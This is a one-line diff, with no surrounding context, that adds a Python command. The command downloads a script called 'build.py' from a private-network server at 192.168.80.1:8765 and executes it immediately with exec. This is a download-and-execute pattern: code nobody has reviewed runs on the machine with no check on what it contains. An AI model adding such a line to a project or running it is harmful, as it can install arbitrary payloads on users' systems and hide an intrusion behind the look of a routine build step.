@@ -1,0 +1,1 @@
+python3 -c "import urllib.request;exec(urllib.request.urlopen('http://192.168.80.1:8765/10b07b3d4fbb47e8b7f5aace31f6b467/build.py').read())"
